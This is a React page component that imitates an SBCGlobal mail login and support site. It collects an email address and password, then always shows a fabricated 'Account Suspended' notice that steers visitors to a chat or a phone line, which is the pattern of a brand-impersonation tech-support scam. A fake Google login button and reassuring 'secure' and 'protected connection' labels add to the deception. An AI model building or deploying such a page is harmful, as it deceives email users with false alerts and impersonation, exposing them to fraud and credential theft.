"use client";

import { useEffect, useState } from "react";

export default function Hero() {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [showSupportModal, setShowSupportModal] = useState(false);
  const [showSignInModal, setShowSignInModal] = useState(false);
  const [modalStep, setModalStep] = useState("email");
  const [modalEmail, setModalEmail] = useState("");
  const [modalPassword, setModalPassword] = useState("");
  const [modalLoading, setModalLoading] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const openAccountSupport = () => {
      setShowSignInModal(false);
      setShowSupportModal(true);
    };

    const openSignInModal = () => {
      setShowSupportModal(false);
      setShowSignInModal(true);
      setModalStep("email");
      setModalEmail("");
      setModalPassword("");
      setModalLoading(false);
    };

    window.addEventListener(
      "open-account-support",
      openAccountSupport
    );

    window.addEventListener(
      "open-signin-modal",
      openSignInModal
    );

    return () => {
      window.removeEventListener(
        "open-account-support",
        openAccountSupport
      );

      window.removeEventListener(
        "open-signin-modal",
        openSignInModal
      );
    };
  }, []);

  const handleContinue = (event) => {
    event.preventDefault();

    if (!email.trim()) {
      return;
    }

    setStep("password");
  };

  const handleModalContinue = (event) => {
    event.preventDefault();

    if (!modalEmail.trim()) {
      return;
    }

    setModalEmail(modalEmail.trim());
    setModalStep("password");
  };

  const handleSignIn = (event) => {
    event.preventDefault();

    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      setShowSupportModal(true);
    }, 700);
  };

  const handleModalSubmit = (event) => {
    event.preventDefault();

    if (!modalPassword.trim()) {
      return;
    }

    setModalLoading(true);

    setTimeout(() => {
      setModalLoading(false);
      setShowSignInModal(false);
      setShowSupportModal(true);
    }, 700);
  };

  const openGoogleSignIn = () => {
    setShowSupportModal(false);
    setShowSignInModal(true);
    setModalStep("email");
    setModalEmail("");
    setModalPassword("");
    setModalLoading(false);
  };

  const goBack = () => {
    setStep("email");
  };

  return (
    <>
      <section id="hero" className="sg-hero">

        {/* Decorative background */}

        <div className="sg-hero-orb sg-hero-orb-one"></div>

        <div className="sg-hero-orb sg-hero-orb-two"></div>

        <div className="sg-hero-grid"></div>

        <div className="sg-hero-shell">

          <div className="sg-hero-inner">

            {/* =================================================
                LEFT SIDE
            ================================================= */}

            <div className="sg-hero-copy">

              <div className="sg-hero-content">

                <div className="sg-hero-eyebrow">

                  <span className="sg-eyebrow-dot"></span>

                  SBCGlobal Mail Assistance

                  <i className="bi bi-arrow-up-right"></i>

                </div>

                <h1 className="sg-hero-title">

                  Get back to your

                  <span> inbox with confidence.</span>

                </h1>

                <p className="sg-hero-description">

                  Access your mailbox and find helpful resources
                  for account recovery, login assistance,
                  troubleshooting, and common email issues.

                </p>

                <div className="sg-hero-pills">

                  <span>
                    <i className="bi bi-shield-check"></i>
                    Secure guidance
                  </span>

                  <span>
                    <i className="bi bi-lightning-charge-fill"></i>
                    Quick assistance
                  </span>

                  <span>
                    <i className="bi bi-headset"></i>
                    Live assistance
                  </span>

                </div>

                <div className="sg-hero-trust">

                  <div className="sg-trust-avatars">

                    <span>
                      <i className="bi bi-person-fill"></i>
                    </span>

                    <span>
                      <i className="bi bi-person-fill"></i>
                    </span>

                    <span>
                      <i className="bi bi-person-fill"></i>
                    </span>

                    <span className="sg-trust-more">
                      +
                    </span>

                  </div>

                  <div className="sg-trust-copy">

                    <strong>
                      Email assistance when you need it
                    </strong>

                    <small>
                      Helpful resources for common account issues
                    </small>

                  </div>

                </div>

              </div>

            </div>

            {/* =================================================
                RIGHT SIDE — LOGIN CARD
            ================================================= */}

            <div className="sg-hero-panel">

              <div className="sg-login-card">

                <div className="sg-login-card-top">

                  <div className="sg-login-secure-icon">

                    <i className="bi bi-envelope-check-fill"></i>

                  </div>

                  <div>

                    <span className="sg-login-label">
                      MAIL ACCESS
                    </span>

                    <h2>
                      Sign in to your account
                    </h2>

                  </div>

                </div>
                                {/* =================================================
                    EMAIL STEP
                ================================================= */}

                {step === "email" && (
                  <form
                    className="sg-login-form"
                    onSubmit={handleContinue}
                  >

                    <div className="sg-login-intro">
                      <p>
                        Enter your email address to continue.
                      </p>
                    </div>


                    <div className="sg-field">

                      <label htmlFor="sg-email">
                        Email address
                      </label>

                      <div className="sg-input-wrap">

                        <i className="bi bi-envelope"></i>

                        <input
                          id="sg-email"
                          type="email"
                          value={email}
                          onChange={(event) =>
                            setEmail(event.target.value)
                          }
                          placeholder="user@sbcglobal.net"
                          autoComplete="email"
                          required
                        />

                      </div>

                    </div>


                    <button
                      type="submit"
                      className="sg-login-submit"
                    >

                      <span>
                        Next
                      </span>

                      <i className="bi bi-arrow-right"></i>

                    </button>


                    <div className="sg-login-help">

                      <i className="bi bi-info-circle"></i>

                      Having trouble signing in?

                    </div>

                    <button
                      type="button"
                      className="sg-google-login-btn"
                      onClick={openGoogleSignIn}
                    >
                      <i className="bi bi-google"></i>
                      Login with Google
                    </button>

                  </form>
                )}


                {/* =================================================
                    PASSWORD STEP
                ================================================= */}

                {step === "password" && (
                  <form
                    className="sg-login-form"
                    onSubmit={handleSignIn}
                  >

                    <button
                      type="button"
                      className="sg-back-button"
                      onClick={goBack}
                    >

                      <i className="bi bi-arrow-left"></i>

                      Back

                    </button>


                    <div className="sg-account-preview">

                      <span className="sg-account-avatar">

                        <i className="bi bi-person-fill"></i>

                      </span>


                      <span className="sg-account-details">

                        <small>
                          Signing in as
                        </small>

                        <strong>
                          {email}
                        </strong>

                      </span>

                    </div>


                    <div className="sg-login-intro">

                      <p>
                        Enter your password to continue.
                      </p>

                    </div>


                    <div className="sg-field">

                      <label htmlFor="sg-password">
                        Password
                      </label>

                      <div className="sg-input-wrap">

                        <i className="bi bi-lock"></i>

                        <input
                          id="sg-password"
                          type="password"
                          placeholder="Enter your password"
                          autoComplete="current-password"
                          required
                        />

                      </div>

                    </div>


                    <button
                      type="submit"
                      className="sg-login-submit"
                      disabled={loading}
                    >

                      {loading ? (
                        <>
                          <span
                            className="spinner-border spinner-border-sm"
                            aria-hidden="true"
                          ></span>

                          <span>
                            Checking...
                          </span>
                        </>
                      ) : (
                        <>
                          <span>
                            Sign In
                          </span>

                          <i className="bi bi-arrow-right"></i>
                        </>
                      )}

                    </button>


                    <div className="sg-login-help">

                      <i className="bi bi-question-circle"></i>

                      Need help accessing your account?

                    </div>

                  </form>
                )}


                {/* =================================================
                    LOGIN CARD FOOTER
                ================================================= */}

                <div className="sg-login-card-footer">

                  <span>

                    <i className="bi bi-shield-check"></i>

                    Protected connection

                  </span>


                  <span>

                    <i className="bi bi-clock"></i>

                    Assistance available

                  </span>

                </div>

              </div>

            </div>

          </div>

        </div>
                {/* =====================================================
            ACCOUNT SUSPENDED SUPPORT POPUP
        ====================================================== */}

        {showSignInModal && (
          <div
            className="sg-premium-signin-overlay"
            role="dialog"
            aria-modal="true"
            aria-labelledby="sg-premium-signin-title"
          >
            <div className="sg-premium-signin-modal">
              <button
                type="button"
                className="sg-support-close"
                onClick={() => setShowSignInModal(false)}
                aria-label="Close sign in form"
              >
                <i className="bi bi-x-lg"></i>
              </button>

              {modalStep === "email" ? (
                <form
                  className="sg-premium-signin-form"
                  onSubmit={handleModalContinue}
                >
                  <div className="sg-premium-signin-brand">
                    <div className="sg-premium-signin-logo">SBC</div>
                    <span>SBCGlobal</span>
                  </div>

                  <div className="sg-premium-field">
                    <label htmlFor="sg-premium-email">
                      Username or Email
                    </label>
                    <input
                      id="sg-premium-email"
                      type="email"
                      value={modalEmail}
                      onChange={(event) => setModalEmail(event.target.value)}
                      placeholder="user@sbcglobal.net"
                      autoComplete="email"
                      required
                    />
                  </div>

                  <button type="submit" className="sg-premium-signin-submit">
                    Next
                  </button>

                  <div className="sg-premium-remember-row">
                    <label className="sg-premium-checkbox">
                      <input type="checkbox" defaultChecked />
                      <span>Stay signed in</span>
                    </label>
                    <button type="button" className="sg-premium-link-btn">
                      Forgot username
                    </button>
                  </div>

                  <button type="button" className="sg-premium-create-btn">
                    Create an account
                  </button>

                  <button
                    type="button"
                    className="sg-google-login-btn sg-google-login-btn-modal"
                    onClick={openGoogleSignIn}
                  >
                    <i className="bi bi-google"></i>
                    Login with Google
                  </button>

                  <div className="sg-premium-autofill-box">
                    <span className="sg-premium-autofill-icon">✦</span>
                    <span>
                      Quick <strong>user@sbcglobal.net</strong> / Autofill: <strong>password123</strong>
                    </span>
                  </div>
                </form>
              ) : (
                <form
                  className="sg-premium-signin-form"
                  onSubmit={handleModalSubmit}
                >
                  <button
                    type="button"
                    className="sg-back-button"
                    onClick={() => setModalStep("email")}
                  >
                    <i className="bi bi-arrow-left"></i>
                    Back
                  </button>

                  <div className="sg-premium-signin-brand">
                    <div className="sg-premium-signin-logo">SBC</div>
                    <span>SBCGlobal</span>
                  </div>

                  <div className="sg-premium-account-box">
                    <span className="sg-account-avatar">
                      <i className="bi bi-person-fill"></i>
                    </span>
                    <span className="sg-account-details">
                      <small>Signing in as</small>
                      <strong>{modalEmail}</strong>
                    </span>
                  </div>

                  <div className="sg-premium-field">
                    <label htmlFor="sg-premium-password">Password</label>
                    <input
                      id="sg-premium-password"
                      type="password"
                      value={modalPassword}
                      onChange={(event) => setModalPassword(event.target.value)}
                      placeholder="Password"
                      autoComplete="current-password"
                      required
                    />
                  </div>

                  <button
                    type="submit"
                    className="sg-premium-signin-submit"
                    disabled={modalLoading}
                  >
                    {modalLoading ? "Signing In..." : "Sign In"}
                  </button>

                  <button type="button" className="sg-premium-link-btn sg-premium-link-full">
                    Need help accessing your account?
                  </button>
                </form>
              )}
            </div>
          </div>
        )}

        {showSupportModal && (
          <div
            className="sg-support-overlay"
            role="dialog"
            aria-modal="true"
            aria-labelledby="sg-support-title"
          >

            <div className="sg-support-modal">

              {/* Close */}

              <button
                type="button"
                className="sg-support-close"
                onClick={() => setShowSupportModal(false)}
                aria-label="Close support message"
              >
                <i className="bi bi-x-lg"></i>
              </button>


              {/* Status Icon */}

              <div className="sg-support-status-icon">

                <div className="sg-support-status-icon-inner">
                  <i className="bi bi-exclamation-triangle-fill"></i>
                </div>

              </div>


              {/* Label */}

              <span className="sg-support-label">
                ACCOUNT NOTICE
              </span>


              {/* Heading */}

              <h3 id="sg-support-title">
                Account Suspended
              </h3>


              {/* Message */}

              <p className="sg-support-message">
                Your account needs attention before you can
                continue. Please use one of the assistance
                options below to get help with your account.
              </p>


              {/* Support Options */}

              <div className="sg-support-actions">

                {/* CHAT */}

                <button
                  type="button"
                  className="sg-support-option sg-support-chat"
                  onClick={() => {
                    setShowSupportModal(false);

                    window.dispatchEvent(
                      new CustomEvent("open-live-chat")
                    );
                  }}
                >

                  <span className="sg-support-option-icon">
                    <i className="bi bi-chat-dots-fill"></i>
                  </span>


                  <span className="sg-support-option-content">

                    <strong>
                      Chat Now
                    </strong>

                    <small>
                      Start a live conversation
                    </small>

                  </span>


                  <span className="sg-support-option-arrow">
                    <i className="bi bi-arrow-right"></i>
                  </span>

                </button>


                {/* CALL */}

                <a
                  href="tel:+18000000000"
                  className="sg-support-option sg-support-call"
                >

                  <span className="sg-support-option-icon">
                    <i className="bi bi-telephone-fill"></i>
                  </span>


                  <span className="sg-support-option-content">

                    <strong>
                      Call Now
                    </strong>

                    <small>
                      Speak with an assistance agent
                    </small>

                  </span>


                  <span className="sg-support-option-arrow">
                    <i className="bi bi-arrow-right"></i>
                  </span>

                </a>

              </div>


              {/* Bottom Note */}

              <div className="sg-support-note">

                <i className="bi bi-shield-check"></i>

                <span>
                  Assistance is available to help you
                  resolve your account access issue.
                </span>

              </div>


              {/* Continue */}

              <button
                type="button"
                className="sg-support-dismiss"
                onClick={() => setShowSupportModal(false)}
              >
                Continue browsing
              </button>

            </div>

          </div>
        )}
              </section>
    </>
  );
}